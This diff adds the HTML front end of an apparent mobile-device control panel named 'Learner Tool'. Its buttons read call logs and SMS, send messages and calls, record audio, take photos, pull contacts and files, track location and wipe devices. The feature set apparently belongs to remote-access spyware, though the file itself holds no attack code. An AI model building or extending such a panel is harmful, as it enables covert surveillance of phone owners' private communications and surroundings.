@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Learner Tool – Premium Admin Dashboard</title>
+  <link rel="stylesheet" href="styles.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="header-content">
+      <div class="header-left">
+        <div class="logo">
+          <i class="fas fa-shield-alt"></i>
+          <h1>Learner Tool</h1>
+        </div>
+        <div class="breadcrumb">
+          <span>Dashboard</span>
+          <i class="fas fa-chevron-right"></i>
+          <span>Device Management</span>
+        </div>
+      </div>
+      <div class="header-right">
+        <div class="search-box">
+          <i class="fas fa-search"></i>
+          <input type="text" placeholder="Search devices..." id="searchInput">
+        </div>
+        <div class="status-indicator">
+          <span id="connectionStatus" class="status-dot offline"></span>
+          <span id="connectionText">Connecting...</span>
+        </div>
+        <div class="user-menu">
+          <i class="fas fa-user-circle"></i>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Sidebar -->
+  <aside class="sidebar" id="sidebar">
+    <nav class="sidebar-nav">
+      <ul>
+        <li class="nav-item active">
+          <a href="#dashboard">
+            <i class="fas fa-tachometer-alt"></i>
+            <span>Dashboard</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#devices">
+            <i class="fas fa-mobile-alt"></i>
+            <span>Devices</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#calls">
+            <i class="fas fa-phone"></i>
+            <span>Call Logs</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#sms">
+            <i class="fas fa-sms"></i>
+            <span>SMS Messages</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#commands">
+            <i class="fas fa-terminal"></i>
+            <span>Commands</span>
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="#analytics">
+            <i class="fas fa-chart-line"></i>
+            <span>Analytics</span>
+          </a>
+        </li>
+      </ul>
+    </nav>
+  </aside>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <!-- Dashboard Overview -->
+    <section class="dashboard-section" id="dashboard-overview">
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-icon blue">
+            <i class="fas fa-mobile-alt"></i>
+          </div>
+          <div class="stat-content">
+            <h3 id="totalDevices">0</h3>
+            <p>Total Devices</p>
+            <span class="stat-trend positive">
+              <i class="fas fa-arrow-up"></i> +12%
+            </span>
+          </div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon green">
+            <i class="fas fa-signal"></i>
+          </div>
+          <div class="stat-content">
+            <h3 id="onlineDevices">0</h3>
+            <p>Online Devices</p>
+            <span class="stat-trend positive">
+              <i class="fas fa-arrow-up"></i> +5%
+            </span>
+          </div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon orange">
+            <i class="fas fa-phone"></i>
+          </div>
+          <div class="stat-content">
+            <h3 id="totalCalls">0</h3>
+            <p>Calls Today</p>
+            <span class="stat-trend negative">
+              <i class="fas fa-arrow-down"></i> -3%
+            </span>
+          </div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon purple">
+            <i class="fas fa-sms"></i>
+          </div>
+          <div class="stat-content">
+            <h3 id="totalSms">0</h3>
+            <p>SMS Today</p>
+            <span class="stat-trend positive">
+              <i class="fas fa-arrow-up"></i> +8%
+            </span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Devices Section -->
+    <section class="content-section">
+      <div class="section-header">
+        <h2>
+          <i class="fas fa-mobile-alt"></i>
+          Connected Devices
+        </h2>
+        <div class="section-actions">
+          <button class="btn btn-secondary" id="refreshDevices">
+            <i class="fas fa-sync-alt"></i>
+            Refresh
+          </button>
+          <button class="btn btn-primary" id="addDevice">
+            <i class="fas fa-plus"></i>
+            Add Device
+          </button>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="table-container">
+          <table id="devicesTable" class="data-table">
+            <thead>
+              <tr>
+                <th>
+                  <input type="checkbox" id="selectAll">
+                </th>
+                <th>Device</th>
+                <th>Status</th>
+                <th>Model</th>
+                <th>OS Version</th>
+                <th>Last Seen</th>
+                <th>Location</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="devicesBody">
+              <tr>
+                <td colspan="8" class="loading">
+                  <div class="loading-spinner"></div>
+                  Loading devices...
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- Device Details Modal -->
+    <div class="modal" id="deviceModal">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h3 id="modalTitle">Device Details</h3>
+          <button class="modal-close" id="closeModal">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+        <div class="modal-body">
+          <div class="details-tabs">
+            <div class="tab-buttons">
+              <button class="tab-btn active" data-tab="profile">
+                <i class="fas fa-info-circle"></i>
+                Profile
+              </button>
+              <button class="tab-btn" data-tab="calls">
+                <i class="fas fa-phone"></i>
+                Calls
+              </button>
+              <button class="tab-btn" data-tab="sms">
+                <i class="fas fa-sms"></i>
+                SMS
+              </button>
+              <button class="tab-btn" data-tab="commands">
+                <i class="fas fa-terminal"></i>
+                Commands
+              </button>
+              <button type="button" class="tab-btn" data-tab="enhanced-data">
+                <i class="fas fa-database"></i>
+                Enhanced Data
+              </button>
+            </div>
+
+            <!-- Profile Tab -->
+            <div class="tab-content active" id="tab-profile">
+              <div class="device-profile">
+                <div class="profile-header">
+                  <div class="device-avatar">
+                    <i class="fas fa-mobile-alt"></i>
+                  </div>
+                  <div class="device-info">
+                    <h4 id="deviceName">Device Name</h4>
+                    <p id="deviceModel">Model Information</p>
+                    <span class="device-status online" id="deviceStatusBadge">Online</span>
+                  </div>
+                </div>
+                <div class="profile-details">
+                  <pre id="profileBox">Select a device to view details...</pre>
+                </div>
+              </div>
+            </div>
+
+            <!-- Calls Tab -->
+            <div class="tab-content" id="tab-calls">
+              <div class="calls-header">
+                <h4>Recent Call Activity</h4>
+                <div class="call-stats">
+                  <div class="call-stat">
+                    <span class="stat-number" id="totalCallsCount">0</span>
+                    <span class="stat-label">Total Calls</span>
+                  </div>
+                  <div class="call-stat">
+                    <span class="stat-number" id="missedCallsCount">0</span>
+                    <span class="stat-label">Missed</span>
+                  </div>
+                </div>
+              </div>
+              <div class="calls-list" id="callsList">
+                <div class="loading">No call data available</div>
+              </div>
+            </div>
+
+            <!-- SMS Tab -->
+            <div class="tab-content" id="tab-sms">
+              <div class="sms-header">
+                <h4>SMS Messages</h4>
+                <button class="btn btn-primary btn-sm" id="sendSmsBtn">
+                  <i class="fas fa-paper-plane"></i>
+                  Send SMS
+                </button>
+              </div>
+
+              <!-- Send SMS Form -->
+              <div class="send-sms-section" id="sendSmsSection" style="display: none;">
+                <form id="smsForm" class="sms-form">
+                  <div class="form-group">
+                    <label>Recipient Phone Number</label>
+                    <input type="tel" id="smsTo" placeholder="+1234567890" required>
+                  </div>
+                  <div class="form-group">
+                    <label>Message</label>
+                    <textarea id="smsMessage" rows="3" maxlength="500" placeholder="Enter your message..."></textarea>
+                    <div class="char-count">0/500 characters</div>
+                  </div>
+                  <div class="form-actions">
+                    <button type="submit" class="btn btn-primary">
+                      <i class="fas fa-paper-plane"></i>
+                      Send Message
+                    </button>
+                    <button type="button" class="btn btn-secondary" id="cancelSms">Cancel</button>
+                  </div>
+                  <div id="smsStatus" class="status-message"></div>
+                </form>
+              </div>
+
+              <div class="sms-list" id="smsList">
+                <div class="loading">No SMS data available</div>
+              </div>
+            </div>
+
+            <!-- Commands Tab -->
+            <div class="tab-content" id="tab-commands">
+              <div class="commands-section">
+                <div class="quick-commands">
+                  <h4>Quick Commands</h4>
+                  <div class="command-grid">
+                    <button type="button" class="quick-cmd-btn" data-cmd="location">
+                      <i class="fas fa-map-marker-alt"></i>
+                      Get Location
+                    </button>
+                    <button type="button" class="quick-cmd-btn" data-cmd="screenshot">
+                      <i class="fas fa-camera"></i>
+                      Screenshot
+                    </button>
+                    <button type="button" class="quick-cmd-btn" data-cmd="lock">
+                      <i class="fas fa-lock"></i>
+                      Lock Device
+                    </button>
+                    <button type="button" class="quick-cmd-btn" data-cmd="wipe">
+                      <i class="fas fa-exclamation-triangle"></i>
+                      Factory Reset
+                    </button>
+                  </div>
+
+                  <h4>Enhanced Controls</h4>
+                  <div class="command-grid">
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="record_audio">
+                      <i class="fas fa-microphone"></i>
+                      Record Audio
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="take_photo">
+                      <i class="fas fa-camera-retro"></i>
+                      Take Photo
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="get_contacts">
+                      <i class="fas fa-address-book"></i>
+                      Get Contacts
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="get_installed_apps">
+                      <i class="fas fa-th-large"></i>
+                      Installed Apps
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="get_wifi_info">
+                      <i class="fas fa-wifi"></i>
+                      WiFi Info
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="get_device_info">
+                      <i class="fas fa-info-circle"></i>
+                      Device Info
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="make_call">
+                      <i class="fas fa-phone"></i>
+                      Make Call
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="set_volume">
+                      <i class="fas fa-volume-up"></i>
+                      Set Volume
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="toggle_wifi">
+                      <i class="fas fa-wifi"></i>
+                      Toggle WiFi
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="get_file_list">
+                      <i class="fas fa-folder"></i>
+                      File Browser
+                    </button>
+                    <button type="button" class="enhanced-cmd-btn" data-cmd="vibrate">
+                      <i class="fas fa-mobile-alt"></i>
+                      Vibrate
+                    </button>
+                  </div>
+                </div>
+                <div class="command-result">
+                  <h5>Last Command Result</h5>
+                  <pre id="lastResultBox">No commands executed yet.</pre>
+                </div>
+              </div>
+            </div>
+
+            <!-- Location Tab -->
+            <div class="tab-content" id="tab-location">
+              <div class="location-section">
+                <h4>Device Location</h4>
+                <div class="location-map" id="locationMap">
+                  <div class="map-placeholder">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <p>Location data will appear here</p>
+                  </div>
+                </div>
+                <div class="location-details" id="locationDetails">
+                  <div class="location-item">
+                    <span class="label">Latitude:</span>
+                    <span class="value" id="latitude">-</span>
+                  </div>
+                  <div class="location-item">
+                    <span class="label">Longitude:</span>
+                    <span class="value" id="longitude">-</span>
+                  </div>
+                  <div class="location-item">
+                    <span class="label">Accuracy:</span>
+                    <span class="value" id="accuracy">-</span>
+                  </div>
+                  <div class="location-item">
+                    <span class="label">Last Updated:</span>
+                    <span class="value" id="locationTime">-</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Enhanced Data Tab -->
+            <div class="tab-content" id="tab-enhanced-data">
+              <div class="enhanced-data-section">
+                <h4>Advanced Data Retrieval</h4>
+                <p>This section will provide advanced data points and controls, such as:</p>
+                <ul>
+                  <li>Real-time sensor data</li>
+                  <li>System performance metrics</li>
+                  <li>Remote file system access</li>
+                  <li>Application management</li>
+                  <li>Network traffic analysis</li>
+                </ul>
+                <div class="data-controls">
+                  <button class="btn btn-secondary" id="startSensorStream">Start Sensor Stream</button>
+                  <button class="btn btn-primary" id="requestFileInfo">Request File Info</button>
+                  <button class="btn btn-secondary" id="getSystemMetrics">Get System Metrics</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Mobile Menu Toggle -->
+    <button class="mobile-menu-toggle" id="mobileMenuToggle">
+      <i class="fas fa-bars"></i>
+    </button>
+  </main>
+
+  <!-- Notifications Container -->
+  <div class="notifications-container" id="notifications">
+  </div>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner large"></div>
+    <p>Loading...</p>
+  </div>
+
+  <script type="module" src="admin.js"></script>
+</body>
+</html>
